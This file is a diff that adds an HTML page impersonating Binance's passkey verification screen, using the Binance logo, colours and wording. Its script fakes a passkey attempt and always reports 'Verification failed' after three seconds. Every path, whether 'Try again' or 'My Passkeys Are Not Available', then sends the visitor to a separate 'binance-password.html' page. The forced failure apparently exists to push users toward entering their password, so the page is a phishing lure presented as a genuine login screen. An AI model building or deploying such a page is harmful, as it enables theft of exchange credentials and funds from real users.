@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance - Verify with passkey</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #1e2329;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: #1e2329;
+            border-radius: 16px;
+            padding: 48px;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #2b3139;
+        }        
+        
+        .binance-logo {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-bottom: 32px;
+        }
+
+        .binance-logo img {
+            height: 32px;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 500;
+            margin-bottom: 48px;
+            color: #ffffff;
+        }        
+        
+        .icon-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 32px;
+            width: 120px;
+            height: 120px;
+        }
+
+        .icon-container svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .passkey-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #474d57;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            position: relative;
+        }
+
+        .key-icon {
+            width: 32px;
+            height: 32px;
+            background-color: #6c757d;
+            border-radius: 50% 50% 50% 0;
+            transform: rotate(-45deg);
+            position: relative;
+        }
+
+        .key-icon::before {
+            content: '';
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            width: 8px;
+            height: 8px;
+            background-color: #2b3139;
+            border-radius: 50%;
+        }
+
+        .key-icon::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            right: -4px;
+            width: 12px;
+            height: 8px;
+            background-color: #6c757d;
+            border-radius: 0 0 4px 4px;
+        }
+
+        .user-icon {
+            width: 64px;
+            height: 64px;
+            background-color: #6c757d;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .user-icon::before {
+            content: '';
+            position: absolute;
+            top: 12px;
+            width: 20px;
+            height: 20px;
+            background-color: #2b3139;
+            border-radius: 50%;
+        }
+
+        .user-icon::after {
+            content: '';
+            position: absolute;
+            bottom: 8px;
+            width: 40px;
+            height: 24px;
+            background-color: #2b3139;
+            border-radius: 20px 20px 0 0;
+        }
+
+        .warning-icon {
+            position: absolute;
+            bottom: -8px;
+            right: 20px;
+            width: 32px;
+            height: 32px;
+            background-color: #f0b90b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #000;
+            font-size: 18px;
+        }
+
+        .content-title {
+            font-size: 20px;
+            text-align: left;
+            font-weight: 500;
+            margin-bottom: 16px;
+            color: #ffffff;
+            transition: all 0.3s ease;
+        }
+
+        .content-message {
+            font-size: 12px;
+            color: #848e9c;
+            text-align: left;
+            margin-bottom: 32px;
+            line-height: 1.5;
+            transition: all 0.3s ease;
+        }
+
+        .action-btn {
+            background-color: #fcd535;
+            color: #000000;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 24px;
+            transition: all 0.3s ease;
+        }
+
+        .action-btn:hover {
+            background-color: #e6a800;
+        }        .action-btn:disabled {
+            opacity: 0.8;
+            cursor: wait;
+        }
+
+        .action-btn .nezha-line {
+            background-color: #1e2329;
+        }
+
+        .passkeys-not-available {
+            color: #fcd535;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+            margin-bottom: 48px;
+            display: inline-block;
+        }
+
+        .passkeys-not-available:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 24px;
+            font-size: 14px;
+            color: #848e9c;
+        }
+
+        .footer a {
+            color: #848e9c;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            color: #ffffff;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }        
+        
+        .globe-icon {
+            color: #848e9c;
+            margin-right: 8px;
+            font-size: 16px;
+        }
+
+        .language-selector:hover .globe-icon {
+            color: #ffffff;
+        }
+
+        /* Fade transition for smooth state changes */
+        .fade-transition {
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .fade-transition.fade-out {
+            opacity: 0;
+        }
+
+        /* Mobile styles */
+        @media (max-width: 768px) {
+            body {
+                background-color: #1e2329;
+                padding: 0;
+                justify-content: flex-start;
+            }
+
+            .container {
+                background-color: transparent;
+                box-shadow: none;
+                border-radius: 0;
+                padding: 24px;
+                max-width: none;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between;
+            }
+
+            .binance-logo {
+                padding: 12px 0px 20px;
+                margin-bottom: 8px;
+                justify-content: flex-start;
+            }
+
+            h1 {
+                font-size: 28px;
+                margin-bottom: 8px;
+                text-align: left;
+            }
+
+            .icon-container {
+                margin-bottom: 0.5rem;
+                justify-content: flex-start;
+            }
+
+            .content-title {
+                font-size: 16px;
+                text-align: left;
+                margin-bottom: 12px;
+            }
+
+            .content-message {
+                text-align: left;
+                margin-bottom: 40px;
+            }
+
+            .passkeys-not-available {
+                margin-bottom: 0;
+            }
+
+            .footer {
+                position: static;
+                transform: none;
+                margin-top: auto;
+                justify-content: center;
+                padding-bottom: 24px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+
+            .passkey-icon {
+                width: 64px;
+                height: 64px;
+                margin-right: 12px;
+            }
+
+            .user-icon {
+                width: 56px;
+                height: 56px;
+            }
+
+            .warning-icon {
+                width: 28px;
+                height: 28px;
+                font-size: 16px;
+                right: 16px;
+            }
+
+            .footer {
+                flex-wrap: wrap;
+                gap: 16px;
+                font-size: 13px;
+            }        }
+
+        /* Loading Spinner Styles */
+        .bn-spinner__nezha {
+            display: inline-flex;
+            gap: 3px;
+            align-items: center;
+            justify-content: center;
+            height: 16px;
+        }
+
+        .nezha-line {
+            width: 2px;
+            height: 16px;
+            border-radius: 1px;
+            background-color: #1e2329;
+            animation: nezha-animation 0.8s ease infinite;
+        }
+
+        .nezha-line:nth-child(1) { animation-delay: -0.3s; }
+        .nezha-line:nth-child(2) { animation-delay: -0.2s; }
+        .nezha-line:nth-child(3) { animation-delay: -0.1s; }
+        .nezha-line:nth-child(4) { animation-delay: 0s; }
+
+        @keyframes nezha-animation {
+            0%, 40%, 100% {
+                transform: scaleY(0.4);
+                opacity: 0.4;
+            }
+            20% {
+                transform: scaleY(1);
+                opacity: 1;
+            }
+        }
+
+        .button-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .button-content.loading .regular-content {
+            display: none;
+        }
+
+        .button-content .loading-content {
+            display: none;
+        }
+
+        .button-content.loading .loading-content {
+            display: inline-flex;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="main-content">            
+            <div class="binance-logo">
+                <img src="binance-h.png" alt="Binance Logo">
+            </div>
+
+            <h1>Verify with passkey</h1>            
+            
+            <div class="icon-container">
+                <!-- Initial state: Simple user and key icons -->
+                <svg id="initial-icon" class="bn-svg fade-transition" viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
+                    <path opacity="0.5" d="M42 30.002c0 7.732 6.269 14 14 14 7.733 0 14-6.269 14-14 0-7.732-6.267-14-14-14-7.731 0-14 6.268-14 14z" fill="#AEB4BC"></path>
+                    <path opacity="0.5" d="M48.001 52.002h-8c-6.628 0-12 5.373-12 12v16h34.14L48.002 80V52.002z" fill="#AEB4BC"></path>
+                    <path opacity="0.5" fill-rule="evenodd" clip-rule="evenodd" d="M70 44a6 6 0 1012 0 6 6 0 00-12 0zm-6 0c0 5.592 3.824 10.29 9 11.623V62h-6v6h6v6h-6v6h12V55.623c5.176-1.332 9-6.03 9-11.622 0-6.628-5.373-12-12-12s-12 5.372-12 12z" fill="#F0B90B"></path>
+                </svg>
+                
+                <!-- Failed state: User, key, and warning icon -->
+                <svg id="failed-icon" class="bn-svg fade-transition" viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                    <path opacity="0.5" fill-rule="evenodd" clip-rule="evenodd" d="M14.001 44a6 6 0 1012 0 6 6 0 00-12 0zm-6 0c0 5.592 3.824 10.29 9 11.623V62h-6v6h6v6h-6v6h12V55.623c5.176-1.332 9-6.03 9-11.622 0-6.628-5.373-12-12-12s-12 5.372-12 12z" fill="#AEB4BC"></path>
+                    <path opacity="0.5" d="M42 30.002c0 7.732 6.269 14 14 14 7.733 0 14-6.269 14-14 0-7.732-6.267-14-14-14-7.731 0-14 6.268-14 14z" fill="#AEB4BC"></path>
+                    <g opacity="0.2" fill="#AEB4BC">
+                        <path d="M72 52.002c4.053 0 7.637 2.01 9.81 5.086A15.96 15.96 0 0076 56a15.96 15.96 0 00-11.999 5.416v-9.415h8zM48.001 52.002h-8c-6.628 0-12 5.373-12 12v16h34.14L48.002 80V52.002z"></path>
+                    </g>
+                    <path opacity="0.5" d="M48.001 52.002v27.999h14.14a15.926 15.926 0 01-2.14-8 15.94 15.94 0 014-10.584v-9.415l-8 8-8-8z" fill="#AEB4BC"></path>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M76 56c-8.836 0-16 7.164-16 16 0 8.837 7.164 16 16 16 8.837 0 16-7.163 16-16 0-8.836-7.163-16-16-16zm-2 6v12h4V62h-4zm0 16v4h4v-4h-4z" fill="#F0B90B"></path>
+                </svg>
+            </div>
+
+            <div id="content-title" class="content-title">Complete verification using your passkey</div>
+            <div id="content-message" class="content-message">
+                Please follow the instructions on your browser to complete verification.
+            </div>            
+            <button type="button" id="action-btn" class="action-btn" onclick="goToPassword()">
+                <div class="button-content">
+                    <span class="regular-content">Try again</span>
+                    <div class="loading-content">
+                        <div class="bn-spinner__nezha">
+                            <div class="nezha-line"></div>
+                            <div class="nezha-line"></div>
+                            <div class="nezha-line"></div>
+                            <div class="nezha-line"></div>
+                        </div>
+                    </div>
+                </div>
+            </button>
+            <a href="binance-password.html" class="passkeys-not-available">My Passkeys Are Not Available</a>
+        </div>
+
+        <div class="footer">            
+            <div class="language-selector">
+                <i class="fa fa-globe globe-icon"></i>
+                <a href="#">English</a>
+            </div>
+            <a href="#">Cookies</a>
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+        </div>
+    </div>    <script>
+        // State management
+        let currentState = 'loading';
+        
+        function transitionToFailedState() {
+            const initialIcon = document.getElementById('initial-icon');
+            const failedIcon = document.getElementById('failed-icon');
+            const contentTitle = document.getElementById('content-title');
+            const contentMessage = document.getElementById('content-message');
+            const actionBtn = document.getElementById('action-btn');
+            const buttonContent = actionBtn.querySelector('.button-content');
+            
+            // Fade out current content
+            initialIcon.classList.add('fade-out');
+            contentTitle.classList.add('fade-out');
+            contentMessage.classList.add('fade-out');
+            actionBtn.classList.add('fade-out');
+            
+            // After fade out completes, change content and fade in
+            setTimeout(() => {
+                // Switch icons
+                initialIcon.style.display = 'none';
+                failedIcon.style.display = 'block';
+                
+                // Update text content
+                contentTitle.textContent = 'Verification failed';
+                contentMessage.textContent = 'The operation either timed out or was not allowed. Try using your passkeys again to complete the verification.';
+                
+                // Update button
+                buttonContent.classList.remove('loading');
+                actionBtn.disabled = false;
+                
+                // Remove fade-out class and let elements fade back in
+                setTimeout(() => {
+                    initialIcon.classList.remove('fade-out');
+                    failedIcon.classList.remove('fade-out');
+                    contentTitle.classList.remove('fade-out');
+                    contentMessage.classList.remove('fade-out');
+                    actionBtn.classList.remove('fade-out');
+                    
+                    currentState = 'failed';
+                }, 50);
+            }, 300);
+        }
+        
+        // Show initial loading state
+        window.addEventListener('load', function() {
+            const actionBtn = document.getElementById('action-btn');
+            if (currentState === 'loading') {
+                const buttonContent = actionBtn.querySelector('.button-content');
+                buttonContent.classList.add('loading');
+                actionBtn.disabled = true;
+            }
+        });
+        
+        // Auto-transition to failed state after 3 seconds
+        setTimeout(() => {
+            if (currentState === 'loading') {
+                transitionToFailedState();
+            }
+        }, 3000);
+        
+        // Add click functionality
+        document.getElementById('action-btn').addEventListener('click', function() {
+            if (currentState === 'failed') {
+                showLoading(this);
+                // Simulate verification attempt
+                setTimeout(() => {
+                    location.reload();
+                }, 2000);
+            }
+        });
+
+        document.querySelector('.passkeys-not-available').addEventListener('click', function(e) {
+            e.preventDefault();
+            console.log('Passkeys not available clicked');
+        });
+
+        function showLoading(button) {
+            const buttonContent = button.querySelector('.button-content');
+            buttonContent.classList.add('loading');
+            button.disabled = true;
+        }
+
+        function goToPassword() {
+            const button = document.getElementById('action-btn');
+            const buttonContent = button.querySelector('.button-content');
+            buttonContent.classList.add('loading');
+            button.disabled = true;
+            setTimeout(() => {
+                window.location.href = 'binance-password.html';
+            }, 1200);
+        }
+    </script>
+</body>
+</html>
